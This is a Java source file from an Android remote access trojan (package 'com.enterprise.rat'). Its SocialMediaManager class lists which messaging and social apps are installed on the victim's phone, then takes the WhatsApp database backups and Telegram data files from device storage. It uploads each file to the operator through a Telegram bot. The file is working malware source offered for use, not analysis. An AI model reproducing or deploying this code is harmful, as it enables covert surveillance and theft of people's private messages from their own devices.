package com.enterprise.rat.commands;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Environment;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class SocialMediaManager {
    private Context context;

    public SocialMediaManager(Context context) { this.context = context; }

    public void auditSocialMedia() {
        String[] apps = {"com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram.messenger"};
        StringBuilder sb = new StringBuilder("<b>🔍 Social Media:</b>\n");
        PackageManager pm = context.getPackageManager();
        for (String pkg : apps) {
            try { pm.getPackageInfo(pkg, 0); sb.append("✅ " + pkg + "\n"); }
            catch (Exception e) { sb.append("❌ " + pkg + "\n"); }
        }
        TelegramApi.sendMessage(sb.toString());
    }

    public void extractWhatsApp() {
        File dir = new File(Environment.getExternalStorageDirectory(), "Android/media/com.whatsapp/WhatsApp/Databases");
        uploadFiles(dir);
    }

    public void extractTelegram() {
        File dir = new File(Environment.getExternalStorageDirectory(), "Android/data/org.telegram.messenger/files");
        uploadFiles(dir);
    }

    private void uploadFiles(File dir) {
        if (!dir.exists()) { TelegramApi.sendMessage("❌ Directory not found"); return; }
        int count = 0;
        for (File f : dir.listFiles()) {
            if (f.isFile()) { TelegramApi.sendFile(f, f.getName()); count++; }
        }
        TelegramApi.sendMessage("✅ Uploaded " + count + " files");
    }
}
